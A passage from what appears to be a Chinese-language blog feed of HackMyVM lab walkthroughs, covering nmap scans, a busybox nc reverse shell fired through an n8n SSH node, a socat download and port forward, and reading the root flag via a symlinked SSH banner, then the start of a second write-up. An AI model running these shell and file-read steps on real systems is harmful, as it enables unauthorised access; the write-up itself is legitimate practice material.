escape_">\&quot;</span>viewport<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20cont</span></span><br><span class="line"><span class="string">SF:ent=<span class="char escape_">\&quot;</span>width=device-width,initial-scale=1<span class="char escape_">\.</span>0<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20/&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;link<span class="char escape_">\x</span>20rel=\</span></span><br><span class="line"><span class="string">SF:&quot;</span>icon\<span class="string">&quot;<span class="char escape_">\x</span>20href=<span class="char escape_">\&quot;</span>/favicon<span class="char escape_">\.</span>ico<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20/&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;style&gt;@media<span class="char escape_">\x</span>20<span class="char escape_">\(</span>prefers</span></span><br><span class="line"><span class="string">SF:-color-scheme:<span class="char escape_">\x</span>20dark<span class="char escape_">\)</span><span class="char escape_">\x</span>20&#123;<span class="char escape_">\x</span>20body<span class="char escape_">\x</span>20&#123;<span class="char escape_">\x</span>20background-color:<span class="char escape_">\x</span>20rgb\</span></span><br><span class="line"><span class="string">SF:(45,<span class="char escape_">\x</span>2046,<span class="char escape_">\x</span>2046<span class="char escape_">\)</span><span class="char escape_">\x</span>20&#125;<span class="char escape_">\x</span>20&#125;&lt;/style&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;script<span class="char escape_">\x</span>20type=<span class="char escape_">\&quot;</span>text/javas</span></span><br><span class="line"><span class="string">SF:cript<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\t</span>window<span class="char escape_">\.</span>BASE_PATH<span class="char escape_">\x</span>20=<span class="char escape_">\x</span>20&#x27;/&#x27;;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\t</span>window<span class="char escape_">\.</span>REST_ENDP</span></span><br><span class="line"><span class="string">SF:OINT<span class="char escape_">\x</span>20=<span class="char escape_">\x</span>20&#x27;rest&#x27;;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;/script&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;script<span class="char escape_">\x</span>20src=<span class="char escape_">\&quot;</span>/rest/sentry\</span></span><br><span class="line"><span class="string">SF:.js<span class="char escape_">\&quot;</span>&gt;&lt;/script&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;script&gt;!function<span class="char escape_">\(</span>t,e<span class="char escape_">\)</span>&#123;var<span class="char escape_">\x</span>20o,n,&quot;</span>)%r(HTTPOptio</span><br><span class="line">SF:ns,<span class="number">183</span>,<span class="string">&quot;HTTP/1<span class="char escape_">\.</span>1<span class="char escape_">\x</span>20404<span class="char escape_">\x</span>20Not<span class="char escape_">\x</span>20Found<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Security-Policy:<span class="char escape_">\x</span>2</span></span><br><span class="line"><span class="string">SF:0default-src<span class="char escape_">\x</span>20&#x27;none&#x27;<span class="char escape_">\r</span><span class="char escape_">\n</span>X-Content-Type-Options:<span class="char escape_">\x</span>20nosniff<span class="char escape_">\r</span><span class="char escape_">\n</span>Content</span></span><br><span class="line"><span class="string">SF:-Type:<span class="char escape_">\x</span>20text/html;<span class="char escape_">\x</span>20charset=utf-8<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Length:<span class="char escape_">\x</span>20143<span class="char escape_">\r</span><span class="char escape_">\n</span>Vary</span></span><br><span class="line"><span class="string">SF::<span class="char escape_">\x</span>20Accept-Encoding<span class="char escape_">\r</span><span class="char escape_">\n</span>Date:<span class="char escape_">\x</span>20Fri,<span class="char escape_">\x</span>2007<span class="char escape_">\x</span>20Feb<span class="char escape_">\x</span>202025<span class="char escape_">\x</span>2013:32:19\</span></span><br><span class="line"><span class="string">SF:x20GMT<span class="char escape_">\r</span><span class="char escape_">\n</span>Connection:<span class="char escape_">\x</span>20close<span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>&lt;!DOCTYPE<span class="char escape_">\x</span>20html&gt;<span class="char escape_">\n</span>&lt;html<span class="char escape_">\x</span>20lang</span></span><br><span class="line"><span class="string">SF:=<span class="char escape_">\&quot;</span>en<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span>&lt;head&gt;<span class="char escape_">\n</span>&lt;meta<span class="char escape_">\x</span>20charset=<span class="char escape_">\&quot;</span>utf-8<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span>&lt;title&gt;Error&lt;/title&gt;<span class="char escape_">\n</span>&lt;/</span></span><br><span class="line"><span class="string">SF:head&gt;<span class="char escape_">\n</span>&lt;body&gt;<span class="char escape_">\n</span>&lt;pre&gt;Cannot<span class="char escape_">\x</span>20OPTIONS<span class="char escape_">\x</span>20/&lt;/pre&gt;<span class="char escape_">\n</span>&lt;/body&gt;<span class="char escape_">\n</span>&lt;/html&gt;<span class="char escape_">\n</span>&quot;</span>)%</span><br><span class="line">SF:r(RTSPRequest,<span class="number">183</span>,<span class="string">&quot;HTTP/1<span class="char escape_">\.</span>1<span class="char escape_">\x</span>20404<span class="char escape_">\x</span>20Not<span class="char escape_">\x</span>20Found<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Security</span></span><br><span class="line"><span class="string">SF:-Policy:<span class="char escape_">\x</span>20default-src<span class="char escape_">\x</span>20&#x27;none&#x27;<span class="char escape_">\r</span><span class="char escape_">\n</span>X-Content-Type-Options:<span class="char escape_">\x</span>20nosniff</span></span><br><span class="line"><span class="string">SF:<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Type:<span class="char escape_">\x</span>20text/html;<span class="char escape_">\x</span>20charset=utf-8<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Length:<span class="char escape_">\x</span>20</span></span><br><span class="line"><span class="string">SF:143<span class="char escape_">\r</span><span class="char escape_">\n</span>Vary:<span class="char escape_">\x</span>20Accept-Encoding<span class="char escape_">\r</span><span class="char escape_">\n</span>Date:<span class="char escape_">\x</span>20Fri,<span class="char escape_">\x</span>2007<span class="char escape_">\x</span>20Feb<span class="char escape_">\x</span>202025<span class="char escape_">\x</span></span></span><br><span class="line"><span class="string">SF:2013:32:19<span class="char escape_">\x</span>20GMT<span class="char escape_">\r</span><span class="char escape_">\n</span>Connection:<span class="char escape_">\x</span>20close<span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>&lt;!DOCTYPE<span class="char escape_">\x</span>20html&gt;<span class="char escape_">\n</span>&lt;h</span></span><br><span class="line"><span class="string">SF:tml<span class="char escape_">\x</span>20lang=<span class="char escape_">\&quot;</span>en<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span>&lt;head&gt;<span class="char escape_">\n</span>&lt;meta<span class="char escape_">\x</span>20charset=<span class="char escape_">\&quot;</span>utf-8<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span>&lt;title&gt;Error&lt;</span></span><br><span class="line"><span class="string">SF:/title&gt;<span class="char escape_">\n</span>&lt;/head&gt;<span class="char escape_">\n</span>&lt;body&gt;<span class="char escape_">\n</span>&lt;pre&gt;Cannot<span class="char escape_">\x</span>20OPTIONS<span class="char escape_">\x</span>20/&lt;/pre&gt;<span class="char escape_">\n</span>&lt;/body&gt;<span class="char escape_">\n</span>&lt;</span></span><br><span class="line"><span class="string">SF:/html&gt;<span class="char escape_">\n</span>&quot;</span>);</span><br><span class="line">MAC <span class="params">Address:</span> DE:<span class="number">86</span>:<span class="number">60</span>:<span class="number">02</span>:F4:<span class="number">97</span> (Unknown)</span><br><span class="line"><span class="params">Warning:</span> OSScan results may be unreliable because we could not find at least <span class="number">1</span> open and <span class="number">1</span> closed port</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">3.41</span> ms bogon (<span class="number">192.168</span>.<span class="number">179.81</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">13.35</span> seconds</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘å‘ç°wcè¿™ä¸æ˜¯è—äº†ä¸€ä¸ªç«¯å£å—ï¼Œè€Œä¸”è¿˜æœ‰httpæœåŠ¡ï¼Œæˆ‘ä¸€è®¿é—®ï¼Œç»“æœå°±æ˜¯è¿™ä¸ªn8n<br>æ‰€ä»¥ä¸€ç›´ä¸æ˜¯æˆ‘çš„n8né…ç½®å•¥çš„å‡ºé—®é¢˜äº†ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯é¶æœºçš„n8n!!!!<br>æ‰€ä»¥æˆ‘å°±æ˜¯çœ‹èŠå¤©è®°å½•å°±å…ˆå…¥ä¸ºä¸»äº†ï¼Œè‡ªå·±ä¿¡æ¯æ”¶é›†çš„è¿˜ä¸å®Œæ•´ï¼Œåƒä¸ªæ•™è®­äº† <br><br>ç„¶åæŒ‰å›¾ä¸­è¾“å…¥å°±å¯ä»¥è¿æ¥æˆåŠŸäº†<br><img src="https://pic1.imgdb.cn/item/67a6229bd0e0a243d4fca313.png"><br>æ¥ç€å»workflowä¸­ é…ç½®ä¸‹ï¼Œç¬¬äºŒä¸ªèŠ‚ç‚¹é€‰sshæ‰§è¡Œå‘½ä»¤<br><img src="https://pic1.imgdb.cn/item/67a6229cd0e0a243d4fca314.png"><br>åŒå‡»è¿™ä¸ªsshå°±å¯ä»¥è¿›å…¥æ‰§è¡Œå‘½ä»¤äº†<br><img src="https://pic1.imgdb.cn/item/67a62297d0e0a243d4fca310.png"><br>ä½†æ˜¯ç›´æ¥ç”¨ncå‘½ä»¤ä¸è¡Œï¼Œæé†’æˆ‘ä»¬è¦ç”¨busybox ï¼Œ busyboxå°±æ˜¯æ•´åˆäº†ä¸€ç³»åˆ—linuxå·¥å…·çš„å°é›†åˆ<br>æ‰§è¡Œçš„å‘½ä»¤ä¸º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">busybox</span> nc <span class="number">192.168.179.11</span> <span class="number">1234</span> -e /bin/sh</span><br></pre></td></tr></table></figure></div>
<p>æˆåŠŸæ‹¿åˆ°webshell</p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>ç°åœ¨çš„é—®é¢˜æ˜¯è¿™ä¸ªshellä¸ç¨³å®šï¼Œè¦å¾—åˆ°ä¸€ä¸ªç¨³å®šçš„shell<br>ç”¨ç¾¤ä¸»çš„æ–¹æ³• åˆ©ç”¨socatè½¬å‘ç«¯å£</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># python3 -m http.server 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port<span class="number"> 80 </span>(http://0.0.0.0:80/) ...</span><br><span class="line"></span><br><span class="line">cd /tmp  </span><br><span class="line">wget 192.168.179.11/socat</span><br><span class="line">ls -al</span><br><span class="line">total 372</span><br><span class="line">drwxrwxrwt   <span class="number"> 4 </span>root     root          <span class="number"> 100 </span>Feb <span class="number"> 7 </span>14:56 .</span><br><span class="line">drwxr-xr-x  <span class="number"> 21 </span>root     root         <span class="number"> 4096 </span>Feb <span class="number"> 6 </span>10:03 ..</span><br><span class="line">drwxrwxrwt   <span class="number"> 2 </span>root     root           <span class="number"> 40 </span>Feb <span class="number"> 7 </span>12:35 .ICE-unix</span><br><span class="line">drwxrwxrwt   <span class="number"> 2 </span>root     root           <span class="number"> 40 </span>Feb <span class="number"> 7 </span>12:35 .X11-unix</span><br><span class="line">-rw-r--r--   <span class="number"> 1 </span>shawa    shawa      <span class="number"> 375176 </span>Feb <span class="number"> 7 </span>14:56 socat</span><br><span class="line">chmod +x socat</span><br><span class="line">./socat TCP-LISTEN:2222,fork TCP4:172.17.0.1:22 &amp;</span><br><span class="line">busybox netstat -lntup</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>172.17.0.1:22           0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>0.0.0.0:2222            0.0.0.0:*               LISTEN      3105/socat</span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>0.0.0.0:5678            0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>0.0.0.0:80              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>:::5678                 :::*                    LISTEN      -</span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>:::80                   :::*                    LISTEN      -</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åå°±å¯ä»¥ç”¨sshå’Œç§é’¥è¿æ¥äº† æ‹¿åˆ°ç¨³å®šshell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="meta"># ssh shawa<span class="comment">@192.168.179.81 -i tmp -p 2222</span></span></span><br><span class="line"><span class="comment"><span class="meta">The authenticity of host &#x27;[192.168.179.81]:2222 ([192.168.179.81]:2222)&#x27; can&#x27;t be established.</span></span></span><br><span class="line"><span class="comment"><span class="meta">ED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.</span></span></span><br><span class="line"><span class="comment"><span class="meta">This key is not known by any other names.</span></span></span><br><span class="line"><span class="comment"><span class="meta">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span></span><br><span class="line"><span class="comment"><span class="meta">Warning: Permanently added &#x27;[192.168.179.81]:2222&#x27; (ED25519) to the list of known hosts.</span></span></span><br><span class="line"><span class="comment"><span class="meta">shawa was here.</span></span></span><br><span class="line"><span class="comment"><span class="meta">Welcome to Alpine!</span></span></span><br><span class="line"><span class="comment"><span class="meta"></span></span></span><br><span class="line"><span class="comment"><span class="meta">The Alpine Wiki contains a large amount of how-to guides and general</span></span></span><br><span class="line"><span class="comment"><span class="meta">information about administrating Alpine systems.</span></span></span><br><span class="line"><span class="comment"><span class="meta">See &lt;https://wiki.alpinelinux.org/&gt;.</span></span></span><br><span class="line"><span class="comment"><span class="meta"></span></span></span><br><span class="line"><span class="comment"><span class="meta">You can setup the system with the command: setup-alpine</span></span></span><br><span class="line"><span class="comment"><span class="meta"></span></span></span><br><span class="line"><span class="comment"><span class="meta">You may change this message by editing /etc/motd.</span></span></span><br><span class="line"><span class="comment"><span class="meta"></span></span></span><br><span class="line"><span class="comment"><span class="meta">hero:~$ </span></span></span><br></pre></td></tr></table></figure></div>
<p>sudo å’Œ suidæ²¡æœ‰å•¥å¯ä»¥ç”¨ä¸Šçš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">hero:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">-sh: <span class="built_in">sudo</span>: not found</span><br><span class="line">hero:~$ find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">/bin/bbsuid</span><br><span class="line">hero:~$ </span><br></pre></td></tr></table></figure></div>
<p>ç»è¿‡ç¾¤é‡Œå¤§ä½¬ä»¬æé†’ï¼Œææƒç”¨sshçš„banneræ‰¾åˆ°sshdé…ç½®æ–‡ä»¶ä¸­çš„bannerä½ç½®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">no</span> <span class="keyword">default</span> banner <span class="type">path</span></span><br><span class="line">Banner /opt/banner.txt </span><br></pre></td></tr></table></figure></div>
<p>åšä¸€ä¸ªè½¯é“¾æ¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">hero:/etc/ssh$ <span class="built_in">cd</span> /opt</span><br><span class="line">hero:/opt$ <span class="built_in">ls</span></span><br><span class="line">banner.txt  containerd</span><br><span class="line">hero:/opt$ <span class="built_in">rm</span> banner.txt</span><br><span class="line">hero:/opt$ <span class="built_in">ln</span> -s /root/root.txt banner.txt</span><br><span class="line">hero:/opt$ </span><br></pre></td></tr></table></figure></div>
<p>ç„¶åå†sshè¿æ¥ å°±æœ‰flagäº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># ssh shawa@192.168.179.81 -i tmp -p 2222</span></span><br><span class="line">HMVNOTINPRODLOL</span><br><span class="line">Welcome <span class="built_in">to</span> Alpine!</span><br><span class="line"></span><br><span class="line">The Alpine Wiki <span class="keyword">contains</span> <span class="keyword">a</span> large amount <span class="keyword">of</span> how-<span class="built_in">to</span> guides <span class="keyword">and</span> general</span><br><span class="line">information about administrating Alpine systems.</span><br><span class="line">See &lt;<span class="keyword">https</span>://wiki.alpinelinux.org/&gt;.</span><br><span class="line"></span><br><span class="line">You can setup <span class="keyword">the</span> <span class="keyword">system</span> <span class="keyword">with</span> <span class="keyword">the</span> <span class="keyword">command</span>: <span class="title">setup-alpine</span></span><br><span class="line"></span><br><span class="line">You may change this message <span class="keyword">by</span> editing /etc/motd.</span><br><span class="line"></span><br><span class="line">hero:~$ </span><br></pre></td></tr></table></figure></div>


]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-jan</title>
    <url>/posts/55566.html</url>
    <content><![CDATA[<p>HMV-jané¶åœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a2dc3ad0e0a243d4fbdfe0.png"></p>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.240.147  </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">10</span>:<span class="number">22</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.147</span> (<span class="number">192.168</span>.<span class="number">240.147</span>)</span><br><span class="line">Host is up (<span class="number">0.0027</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>   open  ssh     OpenSSH <span class="number">9.9</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">256</span> <span class="number">2</span>c:<span class="number">0</span>b:<span class="number">57</span>:a2:b3:e2:<span class="number">0</span>f:<span class="number">6</span>a:c0:<span class="number">61</span>:f2:b7:<span class="number">1</span>f:<span class="number">56</span>:b4:<span class="number">42</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">45</span>:<span class="number">97</span>:b0:<span class="number">2</span>b:<span class="number">48</span>:<span class="number">9</span>b:<span class="number">4</span>a:<span class="number">36</span>:<span class="number">8</span>e:db:<span class="number">44</span>:bd:<span class="number">3</span>f:<span class="number">15</span>:cf:<span class="number">32</span> (ED25519)</span><br><span class="line"><span class="number">8080</span><span class="symbol">/tcp</span> open  http    Golang net<span class="symbol">/http</span> server</span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="symbol">/plain</span>; <span class="attr">charset</span><span class="operator">=</span>utf-<span class="number">8</span>).</span><br><span class="line">| <span class="params">fingerprint-strings:</span> </span><br><span class="line">|   FourOhFourRequest, GetRequest, <span class="params">HTTPOptions:</span> </span><br><span class="line">|     HTTP<span class="symbol">/1.0</span> <span class="number">200</span> OK</span><br><span class="line">|     <span class="params">Date:</span> Wed, <span class="number">05</span> Feb <span class="number">2025</span> <span class="number">02</span>:<span class="number">22</span>:<span class="number">24</span> GMT</span><br><span class="line">|     <span class="params">Content-Length:</span> <span class="number">45</span></span><br><span class="line">|     <span class="params">Content-Type:</span> text<span class="symbol">/plain</span>; <span class="attr">charset</span><span class="operator">=</span>utf-<span class="number">8</span></span><br><span class="line">|     Welcome to our Public Server. Maybe Internal.</span><br><span class="line">|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, <span class="params">Socks5:</span> </span><br><span class="line">|     HTTP<span class="symbol">/1.1</span> <span class="number">400</span> Bad Request</span><br><span class="line">|     <span class="params">Content-Type:</span> text<span class="symbol">/plain</span>; <span class="attr">charset</span><span class="operator">=</span>utf-<span class="number">8</span></span><br><span class="line">|     <span class="params">Connection:</span> close</span><br><span class="line">|     Request</span><br><span class="line">|   <span class="params">OfficeScan:</span> </span><br><span class="line">|     HTTP<span class="symbol">/1.1</span> <span class="number">400</span> Bad <span class="params">Request:</span> missing required Host header</span><br><span class="line">|     <span class="params">Content-Type:</span> text<span class="symbol">/plain</span>; <span class="attr">charset</span><span class="operator">=</span>utf-<span class="number">8</span></span><br><span class="line">|     <span class="params">Connection:</span> close</span><br><span class="line">|_    <span class="params">Request:</span> missing required Host header</span><br><span class="line">|<span class="params">_http-open-proxy:</span> Proxy might be redirecting requests</span><br></pre></td></tr></table></figure></div>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl <span class="number">192.168</span><span class="number">.240</span><span class="number">.147</span>:<span class="number">8080</span>                         </span><br><span class="line">Welcome <span class="keyword">to</span> our <span class="built_in">Public</span> <span class="keyword">Server</span>. Maybe <span class="type">Internal</span>.</span><br></pre></td></tr></table></figure></div>
<p>æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯,æ‰«ä¸€ä¸‹ç›®å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="regexp">/tmp]</span></span><br><span class="line"><span class="regexp">â””â”€# dirsearch -u http:/</span><span class="regexp">/192.168.240.147:8080</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/python</span>3/dist-packages/dirsearch/dirsearch.<span class="symbol">py:</span><span class="number">23</span>: <span class="symbol">DeprecationWarning:</span> pkg_resources is deprecated <span class="keyword">as</span> an API. See <span class="symbol">https:</span>/<span class="regexp">/setuptools.pypa.io/en</span><span class="regexp">/latest/pkg</span>_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_||| _) (<span class="regexp">/_(_|| (_| )</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">Output File: /root</span><span class="regexp">/tmp/reports</span><span class="regexp">/http_192.168.240.147_8080/</span>_25-<span class="number">0</span>2-<span class="number">0</span>5_10-<span class="number">25</span>-<span class="number">54</span>.txt</span><br><span class="line"></span><br><span class="line"><span class="symbol">Target:</span> <span class="symbol">http:</span>/<span class="regexp">/192.168.240.147:8080/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">10</span>:<span class="number">25</span>:<span class="number">54</span>] <span class="symbol">Starting:</span> </span><br><span class="line">[<span class="number">10</span>:<span class="number">25</span>:<span class="number">54</span>] <span class="number">301</span> -   <span class="number">57</span>B  - <span class="regexp">/%2e%2e/</span><span class="regexp">/google.com  -&gt;  /</span>%<span class="number">252E</span>%<span class="number">252E</span>/google.com   </span><br><span class="line">[<span class="number">10</span>:<span class="number">25</span>:<span class="number">57</span>] <span class="number">301</span> -   <span class="number">65</span>B  - <span class="regexp">/axis2/</span><span class="regexp">/axis2-web/</span>HappyAxis.jsp  -&gt;  <span class="regexp">/axis2/axis</span>2-web/HappyAxis.jsp</span><br><span class="line">[<span class="number">10</span>:<span class="number">25</span>:<span class="number">57</span>] <span class="number">301</span> -   <span class="number">59</span>B  - <span class="regexp">/axis2-web/</span><span class="regexp">/HappyAxis.jsp  -&gt;  /axis</span>2-web/HappyAxis.jsp</span><br><span class="line">[<span class="number">10</span>:<span class="number">25</span>:<span class="number">57</span>] <span class="number">301</span> -   <span class="number">54</span>B  - <span class="regexp">/axis/</span><span class="regexp">/happyaxis.jsp  -&gt;  /axis</span><span class="regexp">/happyaxis.jsp     </span></span><br><span class="line"><span class="regexp">[10:25:58] 301 -   87B  - /</span>Citrix/<span class="regexp">/AccessPlatform/auth</span><span class="regexp">/clientscripts/cookies</span>.js  -&gt;  <span class="regexp">/Citrix/</span>AccessPlatform/auth/clientscripts/cookies.js</span><br><span class="line">[<span class="number">10</span>:<span class="number">25</span>:<span class="number">59</span>] <span class="number">301</span> -   <span class="number">77</span>B  - <span class="regexp">/engine/classes</span><span class="regexp">/swfupload/</span><span class="regexp">/swfupload_f9.swf  -&gt;  /engine</span><span class="regexp">/classes/swfupload</span><span class="regexp">/swfupload_f9.swf</span></span><br><span class="line"><span class="regexp">[10:25:59] 301 -   74B  - /engine</span><span class="regexp">/classes/swfupload</span><span class="regexp">//swfupload</span>.swf  -&gt;  <span class="regexp">/engine/classes</span><span class="regexp">/swfupload/swfupload</span>.swf</span><br><span class="line">[<span class="number">10</span>:<span class="number">25</span>:<span class="number">59</span>] <span class="number">301</span> -   <span class="number">62</span>B  - <span class="regexp">/extjs/resources</span><span class="regexp">//charts</span>.swf  -&gt;  <span class="regexp">/extjs/resources</span><span class="regexp">/charts.swf</span></span><br><span class="line"><span class="regexp">[10:26:00] 301 -   72B  - /html</span><span class="regexp">/js/misc</span><span class="regexp">/swfupload/</span><span class="regexp">/swfupload.swf  -&gt;  /html</span><span class="regexp">/js/misc</span><span class="regexp">/swfupload/swfupload</span>.swf</span><br><span class="line">[<span class="number">10</span>:<span class="number">26</span>:<span class="number">0</span>3] <span class="number">400</span> -   <span class="number">24</span>B  - <span class="regexp">/redirect                                         </span></span><br><span class="line"><span class="regexp">[10:26:03] 200 -   16B  - /robots</span>.txt                                   </span><br><span class="line">Task 